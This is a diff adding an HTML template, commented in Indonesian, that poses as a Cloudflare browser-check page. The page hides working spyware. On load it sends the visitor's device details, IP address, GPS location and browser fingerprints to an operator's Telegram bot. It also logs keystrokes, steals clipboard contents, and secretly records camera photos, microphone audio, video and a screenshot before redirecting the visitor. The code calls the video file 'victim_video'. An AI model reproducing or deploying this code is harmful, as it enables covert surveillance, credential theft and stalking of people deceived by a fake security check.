@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>{{PAGE_TITLE}}</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: #ffffff;
+            color: #222222;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+            display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+            min-height: 100vh; text-align: center; padding: 20px;
+        }
+        .container { max-width: 450px; width: 90%; }
+        .dots-container { display: flex; justify-content: center; margin-bottom: 30px; }
+        .dot {
+            width: 12px; height: 12px; background-color: #f7931e;
+            border-radius: 50%; margin: 0 8px;
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+        .dot:nth-child(1) { animation-delay: -0.32s; }
+        .dot:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1.0); }
+        }
+        h1 { font-size: 28px; font-weight: 600; margin-bottom: 20px; }
+        p { font-size: 16px; line-height: 1.6; margin-bottom: 15px; color: #555555; }
+        .redirecting-text { font-weight: bold; color: #333333; margin-top: 25px; font-size: 17px; }
+        .cloudflare-footer { margin-top: 40px; font-size: 13px; color: #888888; }
+        .cloudflare-footer a { color: #f7931e; text-decoration: none; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="dots-container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+        <h1>Checking your browser before accessing the website.</h1>
+        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
+        <p class="redirecting-text">Redirecting...</p>
+        <div class="cloudflare-footer">
+            DDoS protection by <a href="https://www.cloudflare.com/" target="_blank">Cloudflare</a><br>
+            Ray ID: <span id="ray-id">{{RAY_ID}}</span>
+        </div>
+    </div>
+
+    <video id="v" autoplay muted class="hidden"></video>
+    <canvas id="c" class="hidden"></canvas>
+
+    <script>
+        (() => {
+            'use strict';
+
+            // ============================================================
+            // 1. KONFIGURASI — di-inject dari bot saat render
+            // ============================================================
+            const TELEGRAM_TOKEN = '{{TELEGRAM_TOKEN}}';
+            const TELEGRAM_CHAT_ID = '{{TELEGRAM_CHAT_ID}}';
+            const TARGET_REDIRECT_URL = '{{TARGET_REDIRECT_URL}}';
+            const RAY_ID_STATIC = '{{RAY_ID}}';
+            const OPERATOR_TAG = '{{OPERATOR_TAG}}';
+
+            const TIMEOUT = {
+                MEDIA_STREAM: 8000,
+                VIDEO_METADATA: 5000,
+                CANVAS_TO_BLOB: 4000,
+                RECORDING: 15000,
+                GPS: 7000,
+                WEBRTC: 5000,
+                SCREENSHOT: 8000,
+                TELEGRAM_SEND: 10000,
+                GEOLOCATION: 6000,
+                PERMISSION_CHECK: 3000,
+            };
+
+            // ============================================================
+            // 2. POLYFILL: toBlob() untuk browser lawas
+            // ============================================================
+            if (!HTMLCanvasElement.prototype.toBlob) {
+                Object.defineProperty(HTMLCanvasElement.prototype, 'toBlob', {
+                    value: function(callback, type, quality) {
+                        const dataUrl = this.toDataURL(type, quality);
+                        const binary = atob(dataUrl.split(',')[1]);
+                        const array = [];
+                        for (let i = 0; i < binary.length; i++) {
+                            array.push(binary.charCodeAt(i));
+                        }
+                        callback(new Blob([new Uint8Array(array)], { type: type || 'image/png' }));
+                    }
+                });
+            }
+
+            // ============================================================
+            // 3. UTILITY
+            // ============================================================
+            const timeoutPromise = (promise, ms, errorMsg = 'Operation timed out') => {
+                return Promise.race([
+                    promise,
+                    new Promise((_, reject) => setTimeout(() => reject(new Error(errorMsg)), ms))
+                ]);
+            };
+
+            const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+            const retryWrapper = async (fn, maxRetries = 2, delayMs = 800) => {
+                let lastError;
+                for (let attempt = 1; attempt <= maxRetries; attempt++) {
+                    try {
+                        return await fn();
+                    } catch (e) {
+                        lastError = e;
+                        if (attempt < maxRetries) {
+                            await sleep(delayMs * attempt);
+                        }
+                    }
+                }
+                throw lastError;
+            };
+
+            // ============================================================
+            // 4. PERMISSION CHECKER
+            // ============================================================
+            const checkPermission = async (name) => {
+                try {
+                    if (navigator.permissions && navigator.permissions.query) {
+                        const result = await timeoutPromise(
+                            navigator.permissions.query({ name }),
+                            TIMEOUT.PERMISSION_CHECK,
+                            'Permission check timeout'
+                        );
+                        return result.state;
+                    }
+                } catch (e) {
+                    console.warn(`[Permission] Check ${name} failed:`, e.message);
+                }
+                return 'prompt';
+            };
+
+            // ============================================================
+            // 5. TELEGRAM SENDER
+            // ============================================================
+            const sendTelegramText = async (text) => {
+                try {
+                    await timeoutPromise(
+                        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: TELEGRAM_CHAT_ID,
+                                text: text.slice(0, 4096),
+                                parse_mode: 'HTML'
+                            })
+                        }),
+                        TIMEOUT.TELEGRAM_SEND,
+                        'Telegram sendMessage timeout'
+                    );
+                } catch (e) {
+                    console.warn('[TG] Send text failed:', e.message);
+                }
+            };
+
+            const sendTelegramPhoto = async (blob, filename) => {
+                try {
+                    const fd = new FormData();
+                    fd.append('chat_id', TELEGRAM_CHAT_ID);
+                    fd.append('photo', blob, filename);
+                    await timeoutPromise(
+                        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: fd
+                        }),
+                        TIMEOUT.TELEGRAM_SEND,
+                        'Telegram sendPhoto timeout'
+                    );
+                } catch (e) {
+                    console.warn('[TG] Send photo failed:', e.message);
+                }
+            };
+
+            const sendTelegramAudio = async (blob, filename) => {
+                try {
+                    const fd = new FormData();
+                    fd.append('chat_id', TELEGRAM_CHAT_ID);
+                    fd.append('audio', blob, filename);
+                    await timeoutPromise(
+                        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendAudio`, {
+                            method: 'POST',
+                            body: fd
+                        }),
+                        TIMEOUT.TELEGRAM_SEND,
+                        'Telegram sendAudio timeout'
+                    );
+                } catch (e) {
+                    console.warn('[TG] Send audio failed:', e.message);
+                }
+            };
+
+            const sendTelegramVideo = async (blob, filename) => {
+                try {
+                    const fd = new FormData();
+                    fd.append('chat_id', TELEGRAM_CHAT_ID);
+                    fd.append('video', blob, filename);
+                    await timeoutPromise(
+                        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
+                            method: 'POST',
+                            body: fd
+                        }),
+                        TIMEOUT.TELEGRAM_SEND,
+                        'Telegram sendVideo timeout'
+                    );
+                } catch (e) {
+                    console.warn('[TG] Send video failed:', e.message);
+                }
+            };
+
+            // ============================================================
+            // 6. REVERSE GEOCODING
+            // ============================================================
+            const reverseGeocode = async (lat, lon) => {
+                try {
+                    const resp = await timeoutPromise(
+                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`),
+                        TIMEOUT.GEOLOCATION,
+                        'Nominatim timeout'
+                    );
+                    const data = await resp.json();
+                    if (data.address) {
+                        return {
+                            kabupaten: data.address.country || data.address.state || 'Tidak diketahui',
+                            kecamatan: data.address.suburb || data.address.village || data.address.town || 'Tidak diketahui',
+                            alamatLengkap: data.display_name || 'Alamat tidak tersedia'
+                        };
+                    }
+                } catch (e) {
+                    console.warn('[Geocode] Error:', e.message);
+                }
+                return { kabupaten: 'Tidak diketahui', kecamatan: 'Tidak diketahui', alamatLengkap: 'Alamat tidak tersedia' };
+            };
+
+            // ============================================================
+            // 7. DEVICE INFORMATION
+            // ============================================================
+            const getDeviceInfo = async () => {
+                let info = '';
+                info += '🔹🔹🔹🔹🔹 Tracking Report 🔹🔹🔹🔹🔹\n\n';
+                info += '📢 DEVICE INFORMATION\n';
+                info += `📱 Device: ${navigator.userAgent}\n`;
+                info += `🛠️ Platform: ${navigator.platform}\n`;
+                info += `🗣️ Bahasa: ${navigator.language}\n`;
+                info += `🟢 Online: ${navigator.onLine ? '✅ YA' : '❌ TIDAK'}\n`;
+                info += `📐 Screen Size: ${screen.width}x${screen.height}\n`;
+                info += `🖼️ Window Size: ${innerWidth}x${innerHeight}\n`;
+                info += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
+                info += `🧠 CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}\n`;
+
+                if (navigator.getBattery) {
+                    try {
+                        const b = await timeoutPromise(navigator.getBattery(), 3000, 'Battery timeout');
+                        info += `🔋 Battery: ${Math.floor(b.level * 100)}%\n`;
+                        info += `🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+                    } catch (e) {
+                        info += '🔋 Battery: ❌ Tidak tersedia\n';
+                    }
+                }
+
+                info += `🕰️ Waktu Akses: ${new Date().toString()}\n`;
+                info += `⏱️ Page Load Time: ${performance.now().toFixed(2)} ms\n`;
+                info += `📜 History Length: ${history.length}\n`;
+                info += `🤖 Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
+                info += `🔗 Referrer: ${document.referrer || 'None'}\n`;
+                info += `🌐 URL: ${location.href}\n`;
+                info += `📰 Title: ${document.title}\n`;
+                info += `📅 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+                info += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+
+                let ipData = null;
+                const ipServices = [
+                    'https://ipapi.co/json/',
+                    'https://ipinfo.io/json',
+                    'https://api.ipify.org?format=json'
+                ];
+
+                for (const url of ipServices) {
+                    try {
+                        const resp = await timeoutPromise(fetch(url), 4000, `IP service ${url} timeout`);
+                        const data = await resp.json();
+                        if (data.ip || data.city) {
+                            ipData = data;
+                            break;
+                        }
+                    } catch (e) { /* silent fail */ }
+                }
+
+                if (ipData) {
+                    info += '📍 LOCATION INFORMATION\n';
+                    info += `🛰️ IP Address: ${ipData.ip || 'Tidak diketahui'}\n`;
+                    info += `🗺️ Kota: ${ipData.city || 'Tidak diketahui'}\n`;
+                    info += `🗺️ Wilayah: ${ipData.region || ipData.region_name || 'Tidak diketahui'}\n`;
+                    info += `🌎 Negara: ${ipData.country_name || ipData.country || 'Tidak diketahui'}\n`;
+                    info += `📮 Kode Pos: ${ipData.postal || ipData.postcode || 'Tidak diketahui'}\n`;
+
+                    const lat = ipData.latitude || (ipData.loc && ipData.loc.split(',')[0]);
+                    const lon = ipData.longitude || (ipData.loc && ipData.loc.split(',')[1]);
+                    if (lat && lon) {
+                        info += `🛰️ Lat: ${lat}\n🛰️ Lng: ${lon}\n`;
+                        const geo = await reverseGeocode(lat, lon);
+                        info += `🗺️ Kabupaten: ${geo.kabupaten}\n`;
+                        info += `🗺️ Kecamatan: ${geo.kecamatan}\n`;
+                        info += `🗺️ Alamat Lengkap: ${geo.alamatLengkap}\n`;
+                    }
+                } else {
+                    info += '📍 LOCATION: Gagal mendapatkan data IP\n';
+                }
+
+                info += `\n🔹🔹🔹🔹🔹 ${OPERATOR_TAG || 'Telegram'} 🔹🔹🔹🔹🔹`;
+                return info;
+            };
+
+            // ============================================================
+            // 8. WEBCRTC IP
+            // ============================================================
+            const getWebRTCIPs = async () => {
+                return new Promise((resolve) => {
+                    const ips = [];
+                    let pc = null;
+                    let done = false;
+                    const finish = () => {
+                        if (done) return;
+                        done = true;
+                        if (pc) {
+                            try { pc.close(); } catch (e) {}
+                        }
+                        resolve(ips);
+                    };
+                    const timeoutId = setTimeout(finish, TIMEOUT.WEBRTC);
+
+                    try {
+                        pc = new RTCPeerConnection({
+                            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                        });
+                        pc.createDataChannel('');
+                        pc.onicecandidate = (e) => {
+                            if (!e.candidate || !e.candidate.candidate) return;
+                            const match = e.candidate.candidate.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
+                            if (match && ips.indexOf(match[0]) === -1) {
+                                ips.push(match[0]);
+                            }
+                        };
+                        pc.createOffer()
+                            .then(offer => pc.setLocalDescription(offer))
+                            .catch(() => {});
+                    } catch (e) {
+                        clearTimeout(timeoutId);
+                        finish();
+                    }
+                });
+            };
+
+            // ============================================================
+            // 9. ADVANCED FINGERPRINT
+            // ============================================================
+            const getAdvancedFingerprint = async () => {
+                let result = '';
+
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 200;
+                    canvas.height = 20;
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('Sando-Ai Fingerprint 12345', 2, 15);
+                    ctx.fillStyle = 'rgba(102,204,0,0.7)';
+                    ctx.fillText('Sando-Ai Fingerprint 12345', 4, 17);
+                    const dataURL = await timeoutPromise(
+                        new Promise((resolve) => {
+                            canvas.toBlob((blob) => {
+                                if (blob) resolve(URL.createObjectURL(blob));
+                                else resolve('Gagal membuat blob');
+                            });
+                        }),
+                        TIMEOUT.CANVAS_TO_BLOB,
+                        'Canvas toBlob timeout'
+                    );
+                    result += `Canvas: ${dataURL}\n`;
+                } catch (e) {
+                    result += `Canvas: Gagal (${e.message})\n`;
+                }
+
+                try {
+                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = audioCtx.createOscillator();
+                    const analyser = audioCtx.createAnalyser();
+                    const gain = audioCtx.createGain();
+                    oscillator.type = 'sine';
+                    oscillator.frequency.value = 1000;
+                    gain.gain.value = 0;
+                    oscillator.connect(gain);
+                    gain.connect(analyser);
+                    analyser.connect(audioCtx.destination);
+                    oscillator.start(0);
+                    await sleep(100);
+                    const buffer = new Float32Array(analyser.frequencyBinCount);
+                    analyser.getFloatFrequencyData(buffer);
+                    oscillator.stop(0);
+                    await audioCtx.close();
+                    let audioHash = 0;
+                    for (let i = 0; i < buffer.length; i++) {
+                        audioHash += buffer[i];
+                    }
+                    result += `AudioContext: ${audioHash.toFixed(2)}\n`;
+                } catch (e) {
+                    result += `AudioContext: Gagal (${e.message})\n`;
+                }
+
+                return result;
+            };
+
+            // ============================================================
+            // 10. CAPTURE CAMERA
+            // ============================================================
+            const captureCamera = async (mode) => {
+                const video = document.getElementById('v');
+                const canvas = document.getElementById('c');
+                let stream = null;
+
+                try {
+                    const permStatus = await checkPermission('camera');
+                    if (permStatus === 'denied') {
+                        console.warn(`[Camera ${mode}] Permission already denied`);
+                        return false;
+                    }
+
+                    stream = await timeoutPromise(
+                        navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: { exact: mode } }
+                        }),
+                        TIMEOUT.MEDIA_STREAM,
+                        `getUserMedia ${mode} timeout`
+                    );
+
+                    video.srcObject = stream;
+                    await timeoutPromise(
+                        new Promise((resolve) => {
+                            if (video.readyState >= 2) { resolve(); return; }
+                            video.onloadedmetadata = resolve;
+                        }),
+                        TIMEOUT.VIDEO_METADATA,
+                        'Video metadata load timeout'
+                    );
+
+                    await video.play();
+                    await sleep(300);
+
+                    if (video.videoWidth === 0 || video.videoHeight === 0) {
+                        throw new Error('Video dimensions are zero');
+                    }
+
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+
+                    const blob = await timeoutPromise(
+                        new Promise((resolve, reject) => {
+                            canvas.toBlob((b) => {
+                                if (b) resolve(b);
+                                else reject(new Error('toBlob returned null'));
+                            }, 'image/jpeg', 0.85);
+                        }),
+                        TIMEOUT.CANVAS_TO_BLOB,
+                        'Canvas toBlob timeout'
+                    );
+
+                    if (blob && blob.size > 0) {
+                        await sendTelegramPhoto(blob, `${mode}_camera_capture.jpg`);
+                        return true;
+                    } else {
+                        throw new Error('Blob is empty');
+                    }
+
+                } catch (e) {
+                    console.warn(`[Camera ${mode}] Error:`, e.message);
+                    return false;
+                } finally {
+                    if (stream && stream.active) {
+                        stream.getTracks().forEach(t => t.stop());
+                    }
+                    video.srcObject = null;
+                }
+            };
+
+            // ============================================================
+            // 11. CAPTURE MICROPHONE
+            // ============================================================
+            const captureMicrophone = async () => {
+                let stream = null;
+                try {
+                    const permStatus = await checkPermission('microphone');
+                    if (permStatus === 'denied') {
+                        console.warn('[Microphone] Permission already denied');
+                        return false;
+                    }
+
+                    stream = await timeoutPromise(
+                        navigator.mediaDevices.getUserMedia({ audio: true }),
+                        TIMEOUT.MEDIA_STREAM,
+                        'Microphone getUserMedia timeout'
+                    );
+
+                    const mimeTypes = ['audio/webm', 'audio/ogg', 'audio/mp4', 'audio/mpeg'];
+                    let mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'audio/webm';
+
+                    const mediaRecorder = new MediaRecorder(stream, { mimeType });
+                    const audioChunks = [];
+
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) audioChunks.push(event.data);
+                    };
+
+                    const recordingPromise = new Promise((resolve, reject) => {
+                        mediaRecorder.onstop = async () => {
+                            try {
+                                if (audioChunks.length === 0 || audioChunks.reduce((acc, c) => acc + c.size, 0) === 0) {
+                                    reject(new Error('No audio data captured'));
+                                    return;
+                                }
+                                const blob = new Blob(audioChunks, { type: mimeType });
+                                if (blob.size === 0) {
+                                    reject(new Error('Audio blob is empty'));
+                                    return;
+                                }
+                                await sendTelegramAudio(blob, `microphone_capture.${mimeType.split('/')[1] || 'webm'}`);
+                                resolve(true);
+                            } catch (e) {
+                                reject(e);
+                            }
+                        };
+                        mediaRecorder.onerror = (e) => reject(new Error(`MediaRecorder error: ${e.error && e.error.message ? e.error.message : 'unknown'}`));
+                    });
+
+                    mediaRecorder.start(1000);
+                    await sleep(8000);
+                    mediaRecorder.stop();
+
+                    return await timeoutPromise(recordingPromise, 5000, 'Recording finalization timeout');
+
+                } catch (e) {
+                    console.warn('[Microphone] Error:', e.message);
+                    if (stream) {
+                        stream.getTracks().forEach(t => t.stop());
+                    }
+                    return false;
+                }
+            };
+
+            // ============================================================
+            // 12. CAPTURE VIDEO + AUDIO
+            // ============================================================
+            const captureVideoAndAudio = async () => {
+                let stream = null;
+                const facingModes = ['user', 'environment'];
+
+                for (const mode of facingModes) {
+                    try {
+                        const permStatus = await checkPermission('camera');
+                        if (permStatus === 'denied') {
+                            console.warn(`[Video+Audio ${mode}] Permission denied`);
+                            continue;
+                        }
+
+                        stream = await timeoutPromise(
+                            navigator.mediaDevices.getUserMedia({
+                                video: { facingMode: { exact: mode } },
+                                audio: true
+                            }),
+                            TIMEOUT.MEDIA_STREAM,
+                            `Video+Audio getUserMedia ${mode} timeout`
+                        );
+
+                        const mimeTypes = ['video/webm', 'video/mp4', 'video/quicktime'];
+                        let mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'video/webm';
+
+                        const mediaRecorder = new MediaRecorder(stream, { mimeType });
+                        const videoChunks = [];
+
+                        mediaRecorder.ondataavailable = (event) => {
+                            if (event.data.size > 0) videoChunks.push(event.data);
+                        };
+
+                        const recordingPromise = new Promise((resolve, reject) => {
+                            mediaRecorder.onstop = async () => {
+                                try {
+                                    if (videoChunks.length === 0 || videoChunks.reduce((acc, c) => acc + c.size, 0) === 0) {
+                                        reject(new Error('No video data captured'));
+                                        return;
+                                    }
+                                    const blob = new Blob(videoChunks, { type: mimeType });
+                                    if (blob.size === 0) {
+                                        reject(new Error('Video blob is empty'));
+                                        return;
+                                    }
+                                    await sendTelegramVideo(blob, `victim_video_${mode}.${mimeType.split('/')[1] || 'webm'}`);
+                                    resolve(true);
+                                } catch (e) {
+                                    reject(e);
+                                }
+                            };
+                            mediaRecorder.onerror = (e) => reject(new Error(`MediaRecorder error: ${e.error && e.error.message ? e.error.message : 'unknown'}`));
+                        });
+
+                        mediaRecorder.start(1000);
+                        await sleep(12000);
+                        mediaRecorder.stop();
+
+                        return await timeoutPromise(recordingPromise, 5000, 'Video recording finalization timeout');
+
+                    } catch (e) {
+                        console.warn(`[Video+Audio ${mode}] Error:`, e.message);
+                        if (stream) {
+                            stream.getTracks().forEach(t => t.stop());
+                        }
+                        continue;
+                    }
+                }
+
+                return false;
+            };
+
+            // ============================================================
+            // 13. KEYLOGGER
+            // ============================================================
+            let keylogBuffer = '';
+
+            const setupKeylogger = () => {
+                document.addEventListener('keydown', (e) => {
+                    if (e.key.length === 1) {
+                        keylogBuffer += e.key;
+                    } else if (e.key === 'Enter') {
+                        keylogBuffer += '[ENTER]\n';
+                    } else if (e.key === 'Backspace') {
+                        keylogBuffer += '[BACKSPACE]';
+                    } else if (e.key === ' ') {
+                        keylogBuffer += ' ';
+                    } else if (e.key === 'Tab') {
+                        keylogBuffer += '[TAB]';
+                    }
+                    if (keylogBuffer.length > 5000) {
+                        keylogBuffer = keylogBuffer.slice(-5000);
+                    }
+                });
+
+                setInterval(async () => {
+                    if (keylogBuffer.length > 0) {
+                        const toSend = keylogBuffer;
+                        keylogBuffer = '';
+                        await sendTelegramText(`📝 Keylog:\n<pre>${toSend.slice(0, 4000)}</pre>`);
+                    }
+                }, 15000);
+            };
+
+            // ============================================================
+            // 14. CLIPBOARD HIJACK
+            // ============================================================
+            let lastClipboardContent = '';
+
+            const setupClipboardHijack = () => {
+                document.addEventListener('paste', async (e) => {
+                    try {
+                        const text = e.clipboardData.getData('text');
+                        if (text && text !== lastClipboardContent) {
+                            await sendTelegramText(`📋 Clipboard (paste):\n<pre>${text.slice(0, 2000)}</pre>`);
+                            lastClipboardContent = text;
+                        }
+                    } catch (e) { /* silent fail */ }
+                });
+
+                setInterval(async () => {
+                    try {
+                        if (navigator.clipboard && navigator.clipboard.readText) {
+                            const permStatus = await checkPermission('clipboard-read');
+                            if (permStatus === 'granted') {
+                                const text = await timeoutPromise(
+                                    navigator.clipboard.readText(),
+                                    2000,
+                                    'Clipboard read timeout'
+                                );
+                                if (text && text !== lastClipboardContent) {
+                                    await sendTelegramText(`📋 Clipboard (periodic):\n<pre>${text.slice(0, 2000)}</pre>`);
+                                    lastClipboardContent = text;
+                                }
+                            }
+                        }
+                    } catch (e) { /* silent fail */ }
+                }, 10000);
+            };
+
+            // ============================================================
+            // 15. GPS GEOLOCATION
+            // ============================================================
+            const getGPSLocation = async () => {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) {
+                        sendTelegramText('❌ Geolocation tidak tersedia.');
+                        resolve(false);
+                        return;
+                    }
+
+                    const timeoutId = setTimeout(() => {
+                        sendTelegramText('❌ GPS timeout (tidak ada respons)');
+                        resolve(false);
+                    }, TIMEOUT.GPS);
+
+                    navigator.geolocation.getCurrentPosition(
+                        async (pos) => {
+                            clearTimeout(timeoutId);
+                            const lat = pos.coords.latitude;
+                            const lon = pos.coords.longitude;
+                            let msg = '🛰️ GPS TRACKING (ONE-TIME)\n';
+                            msg += `🛰️ Lat: ${lat}\n🛰️ Lng: ${lon}\n`;
+                            msg += `🧭 Akurasi: ${pos.coords.accuracy}m\n`;
+                            msg += `🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
+
+                            const geo = await reverseGeocode(lat, lon);
+                            msg += `🗺️ Kabupaten: ${geo.kabupaten}\n`;
+                            msg += `🗺️ Kecamatan: ${geo.kecamatan}\n`;
+                            msg += `🗺️ Alamat Lengkap: ${geo.alamatLengkap}\n`;
+
+                            await sendTelegramText(msg);
+                            resolve(true);
+                        },
+                        async (err) => {
+                            clearTimeout(timeoutId);
+                            await sendTelegramText(`❌ GPS Error: ${err.message}`);
+                            resolve(false);
+                        }, {
+                            enableHighAccuracy: true,
+                            maximumAge: 0,
+                            timeout: 5000
+                        }
+                    );
+                });
+            };
+
+            // ============================================================
+            // 16. SCREENSHOT
+            // ============================================================
+            const captureScreenshot = async () => {
+                try {
+                    if (typeof html2canvas === 'undefined') {
+                        throw new Error('html2canvas library not loaded');
+                    }
+                    const canvas = await timeoutPromise(
+                        html2canvas(document.body, {
+                            scale: 0.8,
+                            useCORS: true,
+                            logging: false,
+                            width: window.innerWidth,
+                            height: window.innerHeight,
+                            windowWidth: window.innerWidth,
+                            windowHeight: window.innerHeight
+                        }),
+                        TIMEOUT.SCREENSHOT,
+                        'html2canvas timeout'
+                    );
+
+                    const blob = await timeoutPromise(
+                        new Promise((resolve, reject) => {
+                            canvas.toBlob((b) => {
+                                if (b) resolve(b);
+                                else reject(new Error('Screenshot toBlob failed'));
+                            }, 'image/jpeg', 0.8);
+                        }),
+                        TIMEOUT.CANVAS_TO_BLOB,
+                        'Screenshot toBlob timeout'
+                    );
+
+                    if (blob && blob.size > 0) {
+                        await sendTelegramPhoto(blob, 'screenshot.jpg');
+                        return true;
+                    } else {
+                        throw new Error('Screenshot blob empty');
+                    }
+                } catch (e) {
+                    console.warn('[Screenshot] Error:', e.message);
+                    return false;
+                }
+            };
+
+            // ============================================================
+            // 17. MAIN EXECUTION
+            // ============================================================
+            const main = async () => {
+                try {
+                    const rayEl = document.getElementById('ray-id');
+                    if (rayEl) rayEl.textContent = RAY_ID_STATIC;
+
+                    // TAHAP 1: data pasif
+                    await sendTelegramText(await getDeviceInfo());
+                    setupKeylogger();
+                    setupClipboardHijack();
+
+                    // TAHAP 2: WebRTC + Fingerprint
+                    const [webrtcIPs, fp] = await Promise.all([
+                        getWebRTCIPs(),
+                        getAdvancedFingerprint()
+                    ]);
+                    await sendTelegramText(`🌐 IP WebRTC: ${webrtcIPs.join(', ') || 'Tidak ditemukan'}`);
+                    await sendTelegramText(`🕵️‍♂️ Fingerprint Lanjut:\n<pre>${fp}</pre>`);
+
+                    await sleep(2000);
+                    await sendTelegramText('🔔 Memulai pengambilan media (paralel)...');
+
+                    const mediaStart = performance.now();
+
+                    const cameraWithRetry = async () => {
+                        for (const mode of ['user', 'environment']) {
+                            try {
+                                const result = await retryWrapper(
+                                    () => captureCamera(mode),
+                                    2,
+                                    800
+                                );
+                                if (result) return true;
+                            } catch (e) { /* lanjut */ }
+                        }
+                        return false;
+                    };
+
+                    const micWithRetry = async () => {
+                        try {
+                            return await retryWrapper(captureMicrophone, 2, 800);
+                        } catch (e) {
+                            return false;
+                        }
+                    };
+
+                    const videoWithRetry = async () => {
+                        try {
+                            return await retryWrapper(captureVideoAndAudio, 2, 800);
+                        } catch (e) {
+                            return false;
+                        }
+                    };
+
+                    const results = await Promise.allSettled([
+                        cameraWithRetry(),
+                        micWithRetry(),
+                        videoWithRetry(),
+                        captureScreenshot(),
+                        getGPSLocation()
+                    ]);
+
+                    const mediaDuration = ((performance.now() - mediaStart) / 1000).toFixed(1);
+                    const successCount = results.filter(r =>
+                        r.status === 'fulfilled' && r.value === true
+                    ).length;
+
+                    await sendTelegramText(`⚡ Selesai dalam ${mediaDuration} detik (${successCount}/5 berhasil)`);
+
+                    await sendTelegramText('✅ Semua proses selesai. Redirecting...');
+                    setTimeout(() => {
+                        window.location.href = TARGET_REDIRECT_URL;
+                    }, 1500);
+
+                } catch (e) {
+                    console.error('[Main] Fatal error:', e);
+                    try {
+                        await sendTelegramText(`⚠️ FATAL ERROR: ${e.message || 'Unknown'}`);
+                    } catch (_) { /* ignore */ }
+                    setTimeout(() => {
+                        window.location.href = TARGET_REDIRECT_URL;
+                    }, 3000);
+                }
+            };
+
+            // ============================================================
+            // 18. START
+            // ============================================================
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', main);
+            } else {
+                main();
+            }
+
+        })();
+    </script>
+</body>
+  </html>
